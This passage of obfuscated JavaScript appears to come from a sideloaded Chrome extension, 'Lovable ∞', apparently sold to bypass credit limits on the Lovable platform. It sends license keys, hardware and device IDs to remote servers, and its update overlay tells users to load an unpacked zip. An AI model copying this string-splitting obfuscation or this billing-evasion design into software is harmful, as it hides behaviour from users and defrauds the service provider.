_n525e4a['lic'+'ens'+'e_k'+'ey']=_nbd5c1a,_n525e4a['hwi'+'d']=_n1a0df1,_n525e4a['use'+'r_a'+'gen'+'t']=navigator['use'+'rAg'+'ent']||'';
const _n40c368=await _n530b76(_n292e0d,{
'method':'POS'+'T','headers':_n17e476,'body':JSON['str'+'ing'+'ify'](_n525e4a)}
),_n1ad3f0={
}
;
return _n1ad3f0['ses'+'sio'+'n_i'+'d']=_n370ad2,_n1ad3f0['use'+'r_n'+'ame']=_n11a0b1,_n1ad3f0['exp'+'ire'+'s_a'+'t']=_n113406,_n1ad3f0['act'+'iva'+'ted'+'_at']=_n431ca9,_n1ad3f0['sta'+'tus']=_n3883b5,_n34b210(_n40c368,_n1ad3f0);
}
const _n7678da={
}
;
_n7678da['Con'+'ten'+'t-T'+'ype']='app'+'lic'+'ati'+'on/'+'jso'+'n';
const _n2b9ec3={
}
;
return _n2b9ec3['lic'+'ens'+'e_k'+'ey']=_n454ff9,_n2b9ec3['ses'+'sio'+'n_i'+'d']=_n370ad2,_n2b9ec3['hea'+'rtb'+'eat']=!![],_n2b9ec3['dev'+'ice'+'_id']=_n3072c4,await _n530b76(_n49d33d,{
'method':'POS'+'T','headers':_n7678da,'body':JSON['str'+'ing'+'ify'](_n2b9ec3)}
);
}
const _n499fab=0xea60;
function _n50d9db(_n4c3486){
return'ql_'+'res'+'et_'+'cd_'+_n4c3486['toU'+'ppe'+'rCa'+'se']()['tri'+'m']();
}
async function _n5950c4(_n466e20){
const _n5a36ba=(_n466e20||'')['toU'+'ppe'+'rCa'+'se']()['tri'+'m'](),_n35fb1b={
}
;
_n35fb1b['ok']=![],_n35fb1b['mes'+'sag'+'e']='Dig'+'ite'+'\x20a\x20'+'cha'+'ve\x20'+'da\x20'+'lic'+'enç'+'a.';
if(!_n5a36ba)return _n35fb1b;
const _n1488a0=_n50d9db(_n5a36ba),_n2d36eb=await new Promise(_n5da441=>chrome['sto'+'rag'+'e']['loc'+'al']['get']([_n1488a0],_n5da441)),_n4d5264=_n2d36eb[_n1488a0]||0x0,_n9fec76=_n499fab-(Date['now']()-_n4d5264);
if(_n9fec76>0x0)return{
'ok':![],'message':'Agu'+'ard'+'e\x20'+Math['cei'+'l'](_n9fec76/0x3e8)+('s\x20a'+'nte'+'s\x20d'+'e\x20t'+'ent'+'ar\x20'+'res'+'eta'+'r\x20e'+'ssa'+'\x20ch'+'ave'+'\x20de'+'\x20no'+'vo.')}
;
chrome['sto'+'rag'+'e']['loc'+'al']['set']({
[_n1488a0]:Date['now']()}
);
try{
const _n542420={
}
;
_n542420['Con'+'ten'+'t-T'+'ype']='app'+'lic'+'ati'+'on/'+'jso'+'n';
const _n447ebc={
}
;
_n447ebc['lic'+'ens'+'e_k'+'ey']=_n5a36ba;
const _n360e62=await _n530b76(_n4db6bf,{
'method':'POS'+'T','headers':_n542420,'body':JSON['str'+'ing'+'ify'](_n447ebc)}
);
if(_n360e62&&(_n360e62['ok']||_n360e62['suc'+'ces'+'s']||_n360e62['sta'+'tus']==='ok')){
const _n434773={
}
;
return _n434773['ok']=!![],_n434773['mes'+'sag'+'e']='✓\x20D'+'isp'+'osi'+'tiv'+'o\x20d'+'esv'+'inc'+'ula'+'do!'+'\x20Fa'+'ça\x20'+'log'+'in\x20'+'nov'+'ame'+'nte'+'\x20ne'+'sta'+'\x20li'+'cen'+'ça.',_n434773;
}
const _n7bf0f2={
}
;
return _n7bf0f2['ok']=![],_n7bf0f2['mes'+'sag'+'e']=_n360e62&&(_n360e62['mes'+'sag'+'e']||_n360e62['err'+'or'])||'Não'+'\x20fo'+'i\x20p'+'oss'+'íve'+'l\x20r'+'ese'+'tar'+'.\x20V'+'eri'+'fiq'+'ue\x20'+'a\x20c'+'hav'+'e\x20e'+'\x20te'+'nte'+'\x20no'+'vam'+'ent'+'e.',_n7bf0f2;
}
catch(_n4ae165){
return{
'ok':![],'message':'Err'+'o\x20d'+'e\x20c'+'one'+'xão'+':\x20'+(_n4ae165['mes'+'sag'+'e']||String(_n4ae165))}
;
}
}
let _ndbd50c=null;
function _n400ca0(_n3cd1f4,_n5f43ca,_n331832){
const _n3734a4=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'top'+'-ba'+'nne'+'r');
if(!_n3734a4)return;
_ndbd50c&&(clearTimeout(_ndbd50c),_ndbd50c=null),_n3734a4['tex'+'tCo'+'nte'+'nt']=_n3cd1f4,_n3734a4['cla'+'ssN'+'ame']='vis'+'ibl'+'e\x20s'+'p-b'+'ann'+'er-'+_n5f43ca,_ndbd50c=setTimeout(()=>{
_n3734a4['cla'+'ssN'+'ame']='',_n3734a4['tex'+'tCo'+'nte'+'nt']='';
}
,_n331832||0x1388);
}
const _n67a475='\x0a👉\x20'+'Se\x20'+'o\x20e'+'rro'+'\x20pe'+'rsi'+'sti'+'r,\x20'+'atu'+'ali'+'ze\x20'+'a\x20p'+'ági'+'na\x20'+'do\x20'+'Lov'+'abl'+'e\x20('+'F5)'+'.';
function _n591ce8(_n3ca3ea){
const _nec7037=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'sta'+'t-c'+'mds'),_n324162=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'sta'+'t-e'+'co');
if(_nec7037)_nec7037['tex'+'tCo'+'nte'+'nt']=_n3ca3ea;
if(_n324162){
const _n3e4195=(_n3ca3ea*0x2)['toF'+'ixe'+'d'](0x2)['rep'+'lac'+'e']('.',',');
_n324162['tex'+'tCo'+'nte'+'nt']='R$\x20'+_n3e4195;
}
}
function _n3b726c(){
try{
chrome['sto'+'rag'+'e']['loc'+'al']['get'](['ql_'+'cmd'+'_co'+'unt'],_n4fa265=>{
_n591ce8(_n4fa265&&_n4fa265['ql_'+'cmd'+'_co'+'unt']?_n4fa265['ql_'+'cmd'+'_co'+'unt']:0x0);
}
);
}
catch(_n230fc5){
}
}
try{
chrome['sto'+'rag'+'e']['onC'+'han'+'ged']['add'+'Lis'+'ten'+'er']((_n105aff,_n22da4e)=>{
_n22da4e==='loc'+'al'&&_n105aff['ql_'+'cmd'+'_co'+'unt']&&_n591ce8(_n105aff['ql_'+'cmd'+'_co'+'unt']['new'+'Val'+'ue']||0x0);
}
);
}
catch(_n307696){
}
function _n30b6bd(_n1ff0f0){
try{
if(typeof _n1ff0f0==='num'+'ber'&&_n1ff0f0>0x0){
const _n31258c={
}
;
_n31258c['ql_'+'cmd'+'_co'+'unt']=_n1ff0f0,chrome['sto'+'rag'+'e']['loc'+'al']['set'](_n31258c,()=>_n591ce8(_n1ff0f0));
}
else chrome['sto'+'rag'+'e']['loc'+'al']['get'](['ql_'+'cmd'+'_co'+'unt'],_n1cabf7=>{
const _n368804=(_n1cabf7&&_n1cabf7['ql_'+'cmd'+'_co'+'unt']||0x0)+0x1,_n2a529e={
}
;
_n2a529e['ql_'+'cmd'+'_co'+'unt']=_n368804,chrome['sto'+'rag'+'e']['loc'+'al']['set'](_n2a529e,()=>_n591ce8(_n368804));
}
);
}
catch(_nc844d1){
}
}
async function _n1d5526(){
try{
const _n2c1dd9=await new Promise(_n1598bd=>chrome['sto'+'rag'+'e']['loc'+'al']['get'](['ql_'+'lk','ql_'+'ck','ql_'+'ed'],_n1598bd)),_n4c96ba=(_n2c1dd9['ql_'+'ck']||_n2c1dd9['ql_'+'lk']||'')['tri'+'m'](),_n44f02b=(_n2c1dd9['ql_'+'ed']||'')['tri'+'m']();
if(!_n4c96ba)return;
const _n42ac46={
}
;
_n42ac46['Con'+'ten'+'t-T'+'ype']='app'+'lic'+'ati'+'on/'+'jso'+'n',_n42ac46['api'+'key']=_n48aaeb,_n42ac46['Aut'+'hor'+'iza'+'tio'+'n']='Bea'+'rer'+'\x20'+_n48aaeb;
const _n587099={
}
;
_n587099['act'+'ion']='get'+'_st'+'ats',_n587099['use'+'r_l'+'ice'+'nse'+'_ke'+'y']=_n4c96ba,_n587099['dev'+'ice'+'_id']=_n44f02b;
const _n4d7949=await _n530b76(_n15d232,{
'method':'POS'+'T','headers':_n42ac46,'body':JSON['str'+'ing'+'ify'](_n587099)}
);
if(_n4d7949&&typeof _n4d7949['cmd'+'_co'+'unt']==='num'+'ber'){
const _n234ca3=_n4d7949['cmd'+'_co'+'unt'],_n10db04=await new Promise(_n271059=>chrome['sto'+'rag'+'e']['loc'+'al']['get'](['ql_'+'cmd'+'_co'+'unt'],_n271059)),_n377208=_n10db04&&_n10db04['ql_'+'cmd'+'_co'+'unt']||0x0,_n40c974=Math['max'](_n377208,_n234ca3),_n53c3b9={
}
;
_n53c3b9['ql_'+'cmd'+'_co'+'unt']=_n40c974,chrome['sto'+'rag'+'e']['loc'+'al']['set'](_n53c3b9,()=>_n591ce8(_n40c974)),console['log']('[st'+'ats'+']\x20D'+'B\x20s'+'ync'+'\x20|\x20'+'db:',_n234ca3,'|\x20l'+'oca'+'l:',_n377208,'|\x20f'+'ina'+'l:',_n40c974);
}
}
catch(_n553fa){
console['war'+'n']('[st'+'ats'+']\x20_'+'syn'+'cSt'+'ats'+'Fro'+'mDB'+'\x20fa'+'lho'+'u\x20('+'sil'+'enc'+'ios'+'o):',_n553fa);
}
}
function _n3921c7(_n11d8ca){
const _n152d90=/400|http_400/i['tes'+'t'](_n11d8ca),_n45a4c4=/401|http_401|expirado|expired/i['tes'+'t'](_n11d8ca),_n5bac2c=/402|http_402|plan_limit_402|payment_required|out.?of.?credits|sem.?cr[eé]ditos/i['tes'+'t'](_n11d8ca),_n3c9b63=/hwid_mismatch/i['tes'+'t'](_n11d8ca),_n669a67=/captcha_required|captcha/i['tes'+'t'](_n11d8ca),_n2256e4=/403|http_403|license_invalid/i['tes'+'t'](_n11d8ca),_n4ffd08=/429|http_429|rate.?limit|too.?many/i['tes'+'t'](_n11d8ca),_n16ee92=/plan_limit|rate.?limit|\blimit\b|limite\s+ating/i['tes'+'t'](_n11d8ca),_n1270cc=/upload|falha no upload/i['tes'+'t'](_n11d8ca);
let _n4b97f9;
if(_n3c9b63)_n4b97f9=spT('log'+'in_'+'dev'+'ice'+'_co'+'nfl'+'ict');
else{
if(_n669a67)_n4b97f9=spT('err'+'or_'+'cap'+'tch'+'a_r'+'equ'+'ire'+'d');
else{
if(_n2256e4)_n4b97f9=spT('err'+'or_'+'lic'+'ens'+'e_i'+'nva'+'lid');
else{
if(_n45a4c4)_n4b97f9='🔑\x20T'+'oke'+'n\x20e'+'xpi'+'rad'+'o.\x20'+'Atu'+'ali'+'ze\x20'+'a\x20p'+'ági'+'na\x20'+'do\x20'+'Lov'+'abl'+'e\x20('+'F5)'+'\x20e\x20'+'ten'+'te\x20'+'nov'+'ame'+'nte'+'.';
else{
if(_n5bac2c)_n4b97f9=spT('err'+'or_'+'pay'+'men'+'t_r'+'equ'+'ire'+'d');
else{
if(_n4ffd08)_n4b97f9='⏳\x20M'+'uit'+'as\x20'+'ten'+'tat'+'iva'+'s\x20e'+'m\x20p'+'ouc'+'o\x20t'+'emp'+'o.\x20'+'Agu'+'ard'+'e\x20a'+'lgu'+'ns\x20'+'seg'+'und'+'os\x20'+'e\x20t'+'ent'+'e\x20n'+'ova'+'men'+'te.'+_n67a475;
else{
if(_n152d90)_n4b97f9='⚠\x20E'+'rro'+'\x20ao'+'\x20en'+'via'+'r.\x20'+'Agu'+'ard'+'e\x20a'+'lgu'+'ns\x20'+'seg'+'und'+'os\x20'+'e\x20t'+'ent'+'e\x20n'+'ova'+'men'+'te.'+_n67a475;
else{
if(_n16ee92)_n4b97f9='⏳\x20L'+'imi'+'te\x20'+'ati'+'ngi'+'do.'+'\x20Ag'+'uar'+'de\x20'+'alg'+'uns'+'\x20in'+'sta'+'nte'+'s\x20e'+'\x20te'+'nte'+'\x20no'+'vam'+'ent'+'e.'+_n67a475;
else _n1270cc?_n4b97f9='📎\x20'+_n11d8ca+_n67a475:_n4b97f9='⚠\x20'+_n11d8ca+_n67a475;
}
}
}
}
}
}
}
_n400ca0(_n4b97f9,'err'+'or',0x2710);
}
function _n2f6875(_n2504ca){
_n400ca0('⚠\x20'+_n2504ca,'war'+'n',0x1388);
}
function _n2146b4(_n2109cf,_n53683f){
const _n49b3da=document['get'+'Ele'+'men'+'tBy'+'Id']('__s'+'p_r'+'ese'+'t_m'+'oda'+'l__');
if(_n49b3da)_n49b3da['rem'+'ove']();
const _n52a867=document['cre'+'ate'+'Ele'+'men'+'t']('div');
_n52a867['id']='__s'+'p_r'+'ese'+'t_m'+'oda'+'l__',_n52a867['sty'+'le']['css'+'Tex'+'t']='pos'+'iti'+'on:'+'fix'+'ed;
'+'top'+':0;
'+'lef'+'t:0'+';
ri'+'ght'+':0;
'+'bot'+'tom'+':0;
'+'z-i'+'nde'+'x:9'+'999'+'99;
'+'dis'+'pla'+'y:f'+'lex'+';
al'+'ign'+'-it'+'ems'+':ce'+'nte'+'r;
j'+'ust'+'ify'+'-co'+'nte'+'nt:'+'cen'+'ter'+';
ba'+'ckg'+'rou'+'nd:'+'rgb'+'a(0'+',0,'+'0,0'+'.80'+');
b'+'ack'+'dro'+'p-f'+'ilt'+'er:'+'blu'+'r(7'+'px)'+';
-w'+'ebk'+'it-'+'bac'+'kdr'+'op-'+'fil'+'ter'+':bl'+'ur('+'7px'+');
p'+'add'+'ing'+':20'+'px;
'+'box'+'-si'+'zin'+'g:b'+'ord'+'er-'+'box'+';
fo'+'nt-'+'fam'+'ily'+':-a'+'ppl'+'e-s'+'yst'+'em,'+'Bli'+'nkM'+'acS'+'yst'+'emF'+'ont'+',\x22S'+'ego'+'e\x20U'+'I\x22,'+'san'+'s-s'+'eri'+'f;
',_n52a867['inn'+'erH'+'TML']='<di'+'v\x20s'+'tyl'+'e=\x22'+'bac'+'kgr'+'oun'+'d:#'+'131'+'31f'+';
bo'+'rde'+'r:1'+'.5p'+'x\x20s'+'oli'+'d\x20r'+'gba'+'(12'+'4,5'+'8,2'+'37,'+'0.6'+'5);
'+'bor'+'der'+'-ra'+'diu'+'s:2'+'0px'+';
pa'+'ddi'+'ng:'+'28p'+'x\x202'+'2px'+'\x2022'+'px;
'+'wid'+'th:'+'100'+'%;
m'+'ax-'+'wid'+'th:'+'340'+'px;
'+'box'+'-sh'+'ado'+'w:0'+'\x208p'+'x\x204'+'0px'+'\x20rg'+'ba('+'0,0'+',0,'+'0.7'+');
\x22'+'>'+('<h3'+'\x20st'+'yle'+'=\x22c'+'olo'+'r:#'+'fff'+';
fo'+'nt-'+'siz'+'e:1'+'5px'+';
fo'+'nt-'+'wei'+'ght'+':70'+'0;
m'+'arg'+'in:'+'0\x200'+'\x208p'+'x;
t'+'ext'+'-al'+'ign'+':ce'+'nte'+'r;
\x22'+'>A\x20'+'ext'+'ens'+'ão\x20'+'Lov'+'abl'+'e\x20∞'+'\x20in'+'dic'+'a</'+'h3>')+('<p\x20'+'sty'+'le='+'\x22co'+'lor'+':#a'+'0a0'+'b8;
'+'fon'+'t-s'+'ize'+':13'+'px;
'+'mar'+'gin'+':0\x20'+'0\x201'+'2px'+';
te'+'xt-'+'ali'+'gn:'+'cen'+'ter'+';
li'+'ne-'+'hei'+'ght'+':1.'+'4;
\x22'+'>Di'+'git'+'e\x20s'+'ua\x20'+'cha'+'ve\x20'+'de\x20'+'lic'+'enç'+'a<b'+'r><'+'spa'+'n\x20s'+'tyl'+'e=\x22'+'col'+'or:'+'#88'+'8;
f'+'ont'+'-si'+'ze:'+'11p'+'x;
\x22'+'>(L'+'VB-'+'XXX'+'XX-'+'XXX'+'XX-'+'XXX'+'XX)'+'</s'+'pan'+'></'+'p>')+('<in'+'put'+'\x20id'+'=\x22_'+'_sp'+'_re'+'set'+'_ke'+'y__'+'\x22\x20t'+'ype'+'=\x22t'+'ext'+'\x22\x20a'+'uto'+'com'+'ple'+'te='+'\x22of'+'f\x22\x20'+'spe'+'llc'+'hec'+'k=\x22'+'fal'+'se\x22'+'\x20va'+'lue'+'=\x22')+(_n2109cf||'')+('\x22\x20p'+'lac'+'eho'+'lde'+'r=\x22'+'LVB'+'-XX'+'XXX'+'-XX'+'XXX'+'-XX'+'XXX'+'\x22\x20')+('sty'+'le='+'\x22wi'+'dth'+':10'+'0%;
'+'box'+'-si'+'zin'+'g:b'+'ord'+'er-'+'box'+';
ba'+'ckg'+'rou'+'nd:'+'#0d'+'0d1'+'a;
b'+'ord'+'er:'+'1.5'+'px\x20'+'sol'+'id\x20'+'rgb'+'a(1'+'24,'+'58,'+'237'+',0.'+'7);
'+'bor'+'der'+'-ra'+'diu'+'s:1'+'0px'+';
co'+'lor'+':#f'+'ff;
'+'fon'+'t-s'+'ize'+':14'+'px;
'+'pad'+'din'+'g:1'+'0px'+'\x2012'+'px;
'+'out'+'lin'+'e:n'+'one'+';
ma'+'rgi'+'n-b'+'ott'+'om:'+'14p'+'x;
l'+'ett'+'er-'+'spa'+'cin'+'g:0'+'.5p'+'x;
\x22'+'>')+('<p\x20'+'sty'+'le='+'\x22co'+'lor'+':#f'+'fb3'+'47;
'+'fon'+'t-s'+'ize'+':12'+'px;
'+'mar'+'gin'+':0\x20'+'0\x201'+'6px'+';
te'+'xt-'+'ali'+'gn:'+'cen'+'ter'+';
ba'+'ckg'+'rou'+'nd:'+'rgb'+'a(2'+'55,'+'179'+',71'+',0.'+'08)'+';
bo'+'rde'+'r-r'+'adi'+'us:'+'8px'+';
pa'+'ddi'+'ng:'+'9px'+'\x2010'+'px;
'+'lin'+'e-h'+'eig'+'ht:'+'1.4'+';
\x22>'+'⚠\x20I'+'sso'+'\x20va'+'i\x20d'+'esc'+'one'+'cta'+'r\x20a'+'\x20li'+'cen'+'ça\x20'+'do\x20'+'dis'+'pos'+'iti'+'vo\x20'+'atu'+'al.'+'\x20Co'+'nti'+'nua'+'r?<'+'/p>')+('<di'+'v\x20s'+'tyl'+'e=\x22'+'dis'+'pla'+'y:f'+'lex'+';
ga'+'p:1'+'0px'+';
\x22>')+('<bu'+'tto'+'n\x20i'+'d=\x22'+'__s'+'p_r'+'ese'+'t_c'+'anc'+'el_'+'_\x22\x20'+'sty'+'le='+'\x22fl'+'ex:'+'1;
p'+'add'+'ing'+':11'+'px\x20'+'0;
b'+'ord'+'er-'+'rad'+'ius'+':10'+'px;
'+'bor'+'der'+':1.'+'5px'+'\x20so'+'lid'+'\x20rg'+'ba('+'255'+',25'+'5,2'+'55,'+'0.1'+'5);
'+'bac'+'kgr'+'oun'+'d:t'+'ran'+'spa'+'ren'+'t;
c'+'olo'+'r:#'+'a0a'+'0b8'+';
fo'+'nt-'+'siz'+'e:1'+'4px'+';
cu'+'rso'+'r:p'+'oin'+'ter'+';
fo'+'nt-'+'wei'+'ght'+':50'+'0;
\x22'+'>Ca'+'nce'+'lar'+'</b'+'utt'+'on>')+('<bu'+'tto'+'n\x20i'+'d=\x22'+'__s'+'p_r'+'ese'+'t_o'+'k__'+'\x22\x20s'+'tyl'+'e=\x22'+'fle'+'x:1'+';
pa'+'ddi'+'ng:'+'11p'+'x\x200'+';
bo'+'rde'+'r-r'+'adi'+'us:'+'10p'+'x;
b'+'ord'+'er:'+'non'+'e;
b'+'ack'+'gro'+'und'+':li'+'nea'+'r-g'+'rad'+'ien'+'t(1'+'35d'+'eg,'+'#7c'+'3ae'+'d,#'+'9f5'+'ae5'+');
c'+'olo'+'r:#'+'fff'+';
fo'+'nt-'+'siz'+'e:1'+'4px'+';
fo'+'nt-'+'wei'+'ght'+':70'+'0;
c'+'urs'+'or:'+'poi'+'nte'+'r;
l'+'ett'+'er-'+'spa'+'cin'+'g:0'+'.3p'+'x;
\x22'+'>OK'+'</b'+'utt'+'on>')+('</d'+'iv>')+('</d'+'iv>'),document['bod'+'y']['app'+'end'+'Chi'+'ld'](_n52a867);
const _n1afab8=_n52a867['que'+'ryS'+'ele'+'cto'+'r']('#__'+'sp_'+'res'+'et_'+'key'+'__');
setTimeout(()=>{
_n1afab8['foc'+'us'](),_n1afab8['sel'+'ect']();
}
,0x32);
function _n2db684(){
const _n10e929=_n1afab8['val'+'ue']['tri'+'m']();
if(!_n10e929){
_n1afab8['foc'+'us']();
return;
}
_n52a867['rem'+'ove'](),_n53683f(_n10e929);
}
_n52a867['que'+'ryS'+'ele'+'cto'+'r']('#__'+'sp_'+'res'+'et_'+'can'+'cel'+'__')['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',()=>_n52a867['rem'+'ove']()),_n52a867['que'+'ryS'+'ele'+'cto'+'r']('#__'+'sp_'+'res'+'et_'+'ok_'+'_')['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',_n2db684),_n52a867['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',_neac669=>{
if(_neac669['tar'+'get']===_n52a867)_n52a867['rem'+'ove']();
}
),_n1afab8['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('key'+'dow'+'n',_n8ec794=>{
if(_n8ec794['key']==='Ent'+'er')_n2db684();
else{
if(_n8ec794['key']==='Esc'+'ape')_n52a867['rem'+'ove']();
}
}
);
}
function _n176391(_n1dd958){
const _n36677b=/^[✗⚠✕]/['tes'+'t'](_n1dd958)||/erro|falha|expirado|400|401|403|500/i['tes'+'t'](_n1dd958),_n229224=/^⚠/['tes'+'t'](_n1dd958);
if(_n36677b){
_n3921c7(_n1dd958['rep'+'lac'+'e'](/^[✗⚠✕\s]+/,''));
return;
}
if(_n229224){
_n2f6875(_n1dd958['rep'+'lac'+'e'](/^[⚠\s]+/,''));
return;
}
_n400ca0(_n1dd958,'ok',0xbb8);
const _n275634=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'res'+'pon'+'se-'+'box');
_n275634&&(_n275634['tex'+'tCo'+'nte'+'nt']=_n1dd958,_n275634['cla'+'ssL'+'ist']['add']('vis'+'ibl'+'e'),setTimeout(()=>_n275634['cla'+'ssL'+'ist']['rem'+'ove']('vis'+'ibl'+'e'),0xbb8));
}
function _n1f65c2(_n1966a8){
if(!_n1966a8||typeof _n1966a8!=='obj'+'ect')return null;
if(_n1966a8['upd'+'ate'+'_re'+'qui'+'red']===!![]||_n1966a8['ext'+'ens'+'ion'+'_ou'+'tda'+'ted']===!![])return _n583bdb(_n1966a8['upd'+'ate'+'_me'+'ssa'+'ge']||_n1966a8['mes'+'sag'+'e']||null,_n1966a8['upd'+'ate'+'_ur'+'l']||null),'__u'+'pda'+'te_'+'req'+'uir'+'ed_'+'_';
if(_n1966a8['ok']===![]||_n1966a8['suc'+'ces'+'s']===![]||_n1966a8['lic'+'ens'+'e_i'+'nva'+'lid'])return _n1966a8['err'+'or_'+'dis'+'pla'+'y']||_n1966a8['lov'+'abl'+'e_e'+'rro'+'r_t'+'ext']||_n1966a8['mes'+'sag'+'e']||_n1966a8['err'+'or']||'Err'+'o\x20n'+'o\x20e'+'nvi'+'o'+(_n1966a8['sta'+'tus']?'\x20(s'+'tat'+'us\x20'+_n1966a8['sta'+'tus']+')':'');
return null;
}
function _n583bdb(_n2ceaeb,_na9f083){
const _n505100=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'upd'+'ate'+'-ov'+'erl'+'ay');
if(_n505100)return;
const _n28be06=_n2ceaeb||'Uma'+'\x20no'+'va\x20'+'ver'+'são'+'\x20da'+'\x20ex'+'ten'+'são'+'\x20es'+'tá\x20'+'dis'+'pon'+'íve'+'l.\x20'+'Atu'+'ali'+'ze\x20'+'par'+'a\x20c'+'ont'+'inu'+'ar\x20'+'usa'+'ndo'+'.',_n3ef235=_na9f083||'htt'+'ps:'+'//l'+'ova'+'ble'+'sem'+'lim'+'ite'+'s.l'+'ova'+'ble'+'.ap'+'p/l'+'ova'+'ble'+'-in'+'fin'+'ito'+'-v1'+'0.1'+'.zi'+'p',_n599535=document['cre'+'ate'+'Ele'+'men'+'t']('div');
_n599535['id']='sp-'+'upd'+'ate'+'-ov'+'erl'+'ay',_n599535['sty'+'le']['css'+'Tex'+'t']='pos'+'iti'+'on:'+'fix'+'ed;
'+'ins'+'et:'+'0;
z'+'-in'+'dex'+':99'+'999'+';
ba'+'ckg'+'rou'+'nd:'+'var'+'(--'+'bg-'+'mai'+'n,#'+'0a0'+'a0f'+');
d'+'isp'+'lay'+':fl'+'ex;
'+'fle'+'x-d'+'ire'+'cti'+'on:'+'col'+'umn'+';
al'+'ign'+'-it'+'ems'+':ce'+'nte'+'r;
j'+'ust'+'ify'+'-co'+'nte'+'nt:'+'cen'+'ter'+';
ga'+'p:1'+'8px'+';
pa'+'ddi'+'ng:'+'24p'+'x;
t'+'ext'+'-al'+'ign'+':ce'+'nte'+'r;
',_n599535['inn'+'erH'+'TML']='\x0a\x20\x20'+'\x20\x20\x20'+'\x20<d'+'iv\x20'+'sty'+'le='+'\x22fo'+'nt-'+'siz'+'e:4'+'8px'+';
li'+'ne-'+'hei'+'ght'+':1\x22'+'>🚀<'+'/di'+'v>\x0a'+'\x20\x20\x20'+'\x20\x20\x20'+'<di'+'v\x20s'+'tyl'+'e=\x22'+'fon'+'t-s'+'ize'+':18'+'px;
'+'fon'+'t-w'+'eig'+'ht:'+'700'+';
co'+'lor'+':va'+'r(-'+'-te'+'xt-'+'mai'+'n,#'+'e0e'+'0ff'+')\x22>'+'Atu'+'ali'+'zaç'+'ão\x20'+'Nec'+'ess'+'ári'+'a</'+'div'+'>\x0a\x20'+'\x20\x20\x20'+'\x20\x20<'+'div'+'\x20st'+'yle'+'=\x22f'+'ont'+'-si'+'ze:'+'13p'+'x;
c'+'olo'+'r:v'+'ar('+'--t'+'ext'+'-su'+'b,#'+'a0a'+'0c0'+');
m'+'ax-'+'wid'+'th:'+'260'+'px;
'+'lin'+'e-h'+'eig'+'ht:'+'1.5'+'\x22>'+_n28be06+('</d'+'iv>'+'\x0a\x20\x20'+'\x20\x20\x20'+'\x20<a'+'\x20hr'+'ef='+'\x22')+_n3ef235+('\x22\x20t'+'arg'+'et='+'\x22_b'+'lan'+'k\x22\x20'+'sty'+'le='+'\x22\x0a\x20'+'\x20\x20\x20'+'\x20\x20\x20'+'\x20di'+'spl'+'ay:'+'inl'+'ine'+'-fl'+'ex;
'+'ali'+'gn-'+'ite'+'ms:'+'cen'+'ter'+';
ga'+'p:8'+'px;
'+'\x0a\x20\x20'+'\x20\x20\x20'+'\x20\x20\x20'+'pad'+'din'+'g:1'+'2px'+'\x2024'+'px;
'+'mar'+'gin'+'-to'+'p:4'+'px;
'+'\x0a\x20\x20'+'\x20\x20\x20'+'\x20\x20\x20'+'bac'+'kgr'+'oun'+'d:l'+'ine'+'ar-'+'gra'+'die'+'nt('+'135'+'deg'+',#2'+'563'+'eb,'+'#7c'+'3ae'+'d);
'+'\x0a\x20\x20'+'\x20\x20\x20'+'\x20\x20\x20'+'col'+'or:'+'#ff'+'f;
f'+'ont'+'-si'+'ze:'+'13p'+'x;
f'+'ont'+'-we'+'igh'+'t:7'+'00;
'+'\x0a\x20\x20'+'\x20\x20\x20'+'\x20\x20\x20'+'bor'+'der'+'-ra'+'diu'+'s:1'+'2px'+';
te'+'xt-'+'dec'+'ora'+'tio'+'n:n'+'one'+';
\x0a\x20'+'\x20\x20\x20'+'\x20\x20\x20'+'\x20bo'+'x-s'+'had'+'ow:'+'0\x200'+'\x2020'+'px\x20'+'rgb'+'a(3'+'7,9'+'9,2'+'35,'+'0.4'+');
\x0a'+'\x20\x20\x20'+'\x20\x20\x20'+'\x20\x20c'+'urs'+'or:'+'poi'+'nte'+'r;
t'+'ran'+'sit'+'ion'+':op'+'aci'+'ty\x20'+'0.2'+'s;
\x0a'+'\x20\x20\x20'+'\x20\x20\x20'+'\x22\x20o'+'nmo'+'use'+'ove'+'r=\x22'+'thi'+'s.s'+'tyl'+'e.o'+'pac'+'ity'+'=\x27.'+'85\x27'+'\x22\x20o'+'nmo'+'use'+'out'+'=\x22t'+'his'+'.st'+'yle'+'.op'+'aci'+'ty='+'\x271\x27'+'\x22>\x0a'+'\x20\x20\x20'+'\x20\x20\x20'+'\x20\x20⬇'+'\x20Ba'+'ixa'+'r\x20V'+'ers'+'ão\x20'+'Atu'+'ali'+'zad'+'a\x0a\x20'+'\x20\x20\x20'+'\x20\x20<'+'/a>'+'\x0a\x20\x20'+'\x20\x20\x20'+'\x20<d'+'iv\x20'+'sty'+'le='+'\x22fo'+'nt-'+'siz'+'e:1'+'1px'+';
co'+'lor'+':va'+'r(-'+'-te'+'xt-'+'sub'+',#a'+'0a0'+'c0)'+';
op'+'aci'+'ty:'+'0.5'+';
ma'+'x-w'+'idt'+'h:2'+'40p'+'x;
l'+'ine'+'-he'+'igh'+'t:1'+'.4\x22'+'>Ap'+'ós\x20'+'bai'+'xar'+',\x20e'+'xtr'+'aia'+'\x20o\x20'+'zip'+',\x20a'+'ces'+'se\x20'+'chr'+'ome'+'://'+'ext'+'ens'+'ion'+'s,\x20'+'ati'+'ve\x20'+'o\x20M'+'odo'+'\x20De'+'sen'+'vol'+'ved'+'or\x20'+'e\x20c'+'liq'+'ue\x20'+'em\x20'+'\x22Ca'+'rre'+'gar'+'\x20se'+'m\x20c'+'omp'+'act'+'açã'+'o\x22.'+'</d'+'iv>'+'\x0a\x20\x20'+'\x20\x20'),document['bod'+'y']['app'+'end'+'Chi'+'ld'](_n599535);
}
function _n269ea3(_n33bb89,_n3e4700){
const _nfab6b=document['que'+'ryS'+'ele'+'cto'+'r']('.sp'+'-al'+'ert'+'-ov'+'erl'+'ay');
if(_nfab6b)_nfab6b['rem'+'ove']();
const _n534948=document['cre'+'ate'+'Ele'+'men'+'t']('div');
